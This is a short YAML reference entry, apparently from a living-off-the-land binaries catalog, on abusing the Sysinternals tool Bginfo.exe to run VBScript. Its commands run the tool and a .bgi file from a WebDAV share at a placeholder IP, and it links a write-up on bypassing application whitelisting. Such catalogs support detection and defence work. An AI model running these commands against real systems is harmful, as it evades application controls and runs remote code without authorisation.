---
Name: Bginfo.exe
Description: Execute
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: bginfo.exe bginfo.bgi /popup /nolicprompt
    Description: Execute VBscript code that is referenced within the bginfo.bgi file.
  - Command: '"\\10.10.10.10\webdav\bginfo.exe" bginfo.bgi /popup /nolicprompt'
    Description: Execute bginfo.exe from a WebDAV server.
  - Command: '"\\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi
      /popup /nolicprompt'
    Description: This style of execution may not longer work due to patch.
Full Path:
  - No fixed path
Code Sample: []
Detection: []
Resources:
  - https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
Notes: Thanks to Oddvar Moe - @oddvarmoe
---